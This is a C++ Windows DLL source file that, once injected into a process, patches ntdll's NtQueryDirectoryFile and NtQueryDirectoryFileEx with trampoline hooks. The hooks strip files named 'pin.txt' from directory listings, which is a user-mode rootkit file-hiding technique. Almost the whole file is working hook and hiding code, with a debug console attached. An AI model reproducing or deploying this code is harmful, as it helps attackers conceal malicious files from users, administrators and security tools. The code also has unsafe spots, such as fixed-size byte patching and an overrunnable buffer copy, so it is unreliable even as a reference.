// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <psapi.h>
#include <winnt.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <string.h>
#include <assert.h>
#include <errno.h>
#include <stddef.h>
#include <stdlib.h>
#include <stddef.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

const WCHAR* HiddenFiles[1] = { L"pin.txt" };

typedef enum class NEW_FILE_INFORMATION_CLASS
{
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,                   // 2
	FileBothDirectoryInformation,                   // 3
	FileBasicInformation,                           // 4
	FileStandardInformation,                        // 5
	FileInternalInformation,                        // 6
	FileEaInformation,                              // 7
	FileAccessInformation,                          // 8
	FileNameInformation,                            // 9
	FileRenameInformation,                          // 10
	FileLinkInformation,                            // 11
	FileNamesInformation,                           // 12
	FileDispositionInformation,                     // 13
	FilePositionInformation,                        // 14
	FileFullEaInformation,                          // 15
	FileModeInformation,                            // 16
	FileAlignmentInformation,                       // 17
	FileAllInformation,                             // 18
	FileAllocationInformation,                      // 19
	FileEndOfFileInformation,                       // 20
	FileAlternateNameInformation,                   // 21
	FileStreamInformation,                          // 22
	FilePipeInformation,                            // 23
	FilePipeLocalInformation,                       // 24
	FilePipeRemoteInformation,                      // 25
	FileMailslotQueryInformation,                   // 26
	FileMailslotSetInformation,                     // 27
	FileCompressionInformation,                     // 28
	FileObjectIdInformation,                        // 29
	FileCompletionInformation,                      // 30
	FileMoveClusterInformation,                     // 31
	FileQuotaInformation,                           // 32
	FileReparsePointInformation,                    // 33
	FileNetworkOpenInformation,                     // 34
	FileAttributeTagInformation,                    // 35
	FileTrackingInformation,                        // 36
	FileIdBothDirectoryInformation,                 // 37
	FileIdFullDirectoryInformation,                 // 38
	FileValidDataLengthInformation,                 // 39
	FileShortNameInformation,                       // 40
	FileIoCompletionNotificationInformation,        // 41
	FileIoStatusBlockRangeInformation,              // 42
	FileIoPriorityHintInformation,                  // 43
	FileSfioReserveInformation,                     // 44
	FileSfioVolumeInformation,                      // 45
	FileHardLinkInformation,                        // 46
	FileProcessIdsUsingFileInformation,             // 47
	FileNormalizedNameInformation,                  // 48
	FileNetworkPhysicalNameInformation,             // 49
	FileIdGlobalTxDirectoryInformation,             // 50
	FileIsRemoteDeviceInformation,                  // 51
	FileUnusedInformation,                          // 52
	FileNumaNodeInformation,                        // 53
	FileStandardLinkInformation,                    // 54
	FileRemoteProtocolInformation,                  // 55

	FileRenameInformationBypassAccessCheck,         // 56
	FileLinkInformationBypassAccessCheck,           // 57

	FileVolumeNameInformation,                      // 58
	FileIdInformation,                              // 59
	FileIdExtdDirectoryInformation,                 // 60
	FileReplaceCompletionInformation,               // 61
	FileHardLinkFullIdInformation,                  // 62
	FileIdExtdBothDirectoryInformation,             // 63
	FileDispositionInformationEx,                   // 64
	FileRenameInformationEx,                        // 65
	FileRenameInformationExBypassAccessCheck,       // 66
	FileDesiredStorageClassInformation,             // 67
	FileStatInformation,                            // 68
	FileMemoryPartitionInformation,                 // 69
	FileStatLxInformation,                          // 70
	FileCaseSensitiveInformation,                   // 71
	FileLinkInformationEx,                          // 72
	FileLinkInformationExBypassAccessCheck,         // 73
	FileStorageReserveIdInformation,                // 74
	FileCaseSensitiveInformationForceAccessCheck,   // 75
	FileKnownFolderInformation,                     // 76

	FileMaximumInformation
} NEW_FILE_INFORMATION_CLASS, * _PNEW_FILE_INFORMATION_CLASS;

typedef struct _FILE_BOTH_DIRECTORY_INFORMATION
{
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaInformationLength;
	UCHAR         AlternateNameLength;
	WCHAR         AlternateName[12];
	WCHAR         FileName[1];
} FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION
{
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;


typedef struct _FILE_FULL_DIR_INFORMATION
{
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	WCHAR         FileName[1];
} FILE_FULL_DIR_INFORMATION, * PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION
{
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, * PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION
{
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	LARGE_INTEGER FileId;
	GUID          LockingTransactionId;
	ULONG         TxInfoFlags;
	WCHAR         FileName[1];
} FILE_ID_GLOBAL_TX_DIR_INFORMATION, * PFILE_ID_GLOBAL_TX_DIR_INFORMATION;

typedef struct _FILE_ID_EXTD_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	ULONG         ReparsePointTag;
	FILE_ID_128   FileId;
	WCHAR         FileName[1];
} FILE_ID_EXTD_DIR_INFORMATION, * PFILE_ID_EXTD_DIR_INFORMATION;

typedef struct _FILE_ID_EXTD_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	ULONG         ReparsePointTag;
	FILE_ID_128   FileId;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	WCHAR         FileName[1];
} FILE_ID_EXTD_BOTH_DIR_INFORMATION, * PFILE_ID_EXTD_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	ULONG FileNameLength;
	WCHAR FileName[1];
} FILE_NAMES_INFORMATION, * PFILE_NAMES_INFORMATION;

typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	NEW_FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
	);

typedef NTSTATUS(NTAPI* NtQueryDirectoryFileEx_t)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                 Length,
	NEW_FILE_INFORMATION_CLASS FileInformationClass,
	ULONG                  QueryFlags,
	PUNICODE_STRING        FileName
	);

NtQueryDirectoryFile_t origNtQueryDirectoryFile = NULL;
NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx = NULL;

WCHAR* wcsstr_s(const WCHAR* dst, const WCHAR** src, ULONG dstSizeInBytes, ULONG srcSize) {
	if (dstSizeInBytes == 0 || dstSizeInBytes > 2000) {
		return NULL;
	}

	WCHAR dstCopy[1000] = { 0 };
	memcpy(dstCopy, dst, dstSizeInBytes);
	dstCopy[dstSizeInBytes / sizeof(WCHAR) + 1] = L'\0';
	for (int i = 0; i < srcSize; i++) {
		WCHAR* res = wcsstr(dstCopy, src[i]);
		if (res) {
			return (WCHAR*)src[i];
		}
	}
	return NULL;
}

template <typename T>
void EnumerateGenericDirectoryInformation(LPVOID FileInformation) {
	T current = (T)FileInformation;
	if (current == NULL) {
		return;
	}
	while (current->NextEntryOffset != 0) {
		T next = (T)((uintptr_t)current + current->NextEntryOffset);
		WCHAR* res = wcsstr_s(next->FileName, HiddenFiles, next->FileNameLength, 1);
		if (res) {
			printf("%ls matched with %ls and hidden\n", next->FileName, res);
			if (next->NextEntryOffset == 0) {
				current->NextEntryOffset = 0;
				break;
			}
			current->NextEntryOffset += next->NextEntryOffset;
		}
		else {
			current = next;
		}
	}
}

NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, NEW_FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS result = ((NtQueryDirectoryFile_t)origNtQueryDirectoryFile)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan); 
	if (result != STATUS_SUCCESS) {
		return result;
	}

	switch (FileInformationClass) {
	case NEW_FILE_INFORMATION_CLASS::FileDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_DIRECTORY_INFORMATION>(FileInformation);
		break;
	case NEW_FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_BOTH_DIR_INFORMATION>(FileInformation);
		break;
	case NEW_FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_ID_BOTH_DIR_INFORMATION>(FileInformation);
		break;
	}
   
    return result;
}


NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, NEW_FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    NTSTATUS result = ((NtQueryDirectoryFileEx_t)origNtQueryDirectoryFileEx)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
	if (result != STATUS_SUCCESS) {
		return result;
	}

	switch (FileInformationClass) {
	case NEW_FILE_INFORMATION_CLASS::FileDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_DIRECTORY_INFORMATION>(FileInformation);
		break;
	case NEW_FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_BOTH_DIR_INFORMATION>(FileInformation);
		break;
	case NEW_FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
		EnumerateGenericDirectoryInformation<PFILE_ID_BOTH_DIR_INFORMATION>(FileInformation);
		break;
	}
	return result;
}

template <typename T>
int contains(T* arr, T target, int size) {
	for (int i = 0; i < size; i++) {
		if (arr[i] == target) {
			return 1;
		}
	}
	return 0;
}

PVOID AllocateUniquePage(PVOID* existing, int num) {
	uintptr_t initial = NULL;
	PVOID alloc = VirtualAlloc((PVOID*)initial, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	while (contains<PVOID>(existing, alloc, num) == 1 || alloc == NULL) {
		if (0xFFFFFFFFFFFFFFFF - initial < 1024) {
			return NULL;
		}
		initial += 1024;
		alloc = VirtualAlloc((PVOID*)initial, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	return alloc;
}

void InstallAbsJump(uintptr_t srcAddr, PVOID dstAddr) {
	*(BYTE*)srcAddr = 0xFF;
	*(BYTE*)(srcAddr + 1) = 0x25;
	memset((PVOID)(srcAddr + 2), 0, 4);
	memcpy((PVOID)(srcAddr + 6), &dstAddr, 8); // Copy absolute jump addr to JMP operand
}

PVOID allocated[1000] = { 0 }; // Doing it this way isn't thread safe
int allocatedIndex = 0;
PVOID InstallHook(uintptr_t srcAddr, PVOID dstAddr, int size) {
    DWORD oldProt;
    VirtualProtect((PVOID)srcAddr, size, PAGE_EXECUTE_READWRITE, &oldProt);

    BYTE stolenBytes[100];
    memcpy(stolenBytes, (PVOID*)srcAddr, size); // backup stolen bytes
    memset((PVOID)srcAddr, 0x90, size); // Nop stolen region

    PVOID tramp = AllocateUniquePage(allocated, allocatedIndex);
    if (tramp == NULL) {
        std::cout << "Unable to allocate memory" << std::endl;
        return (PVOID*)srcAddr;
    }
	allocated[allocatedIndex] = tramp;
	allocatedIndex++;

	InstallAbsJump(srcAddr, dstAddr); // Jmp to hooked func
    
	memcpy(tramp, stolenBytes, size);
	InstallAbsJump((uintptr_t)tramp + size, (PVOID)(srcAddr + size)); // Jmp from tramp to orig func

    VirtualProtect((PVOID)srcAddr, size, oldProt, &oldProt);
    return tramp;
}

DWORD WINAPI main(HMODULE hModule) {
    AllocConsole();
    FILE* f;
    FILE* f2;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f2, "CONIN$", "r", stdin);

    origNtQueryDirectoryFile = (NtQueryDirectoryFile_t)InstallHook((uintptr_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFile"), HookedNtQueryDirectoryFile, 16);
    origNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)InstallHook((uintptr_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFileEx"), HookedNtQueryDirectoryFileEx, 16);

    while (true) {}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)main, hModule, 0, nullptr));
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

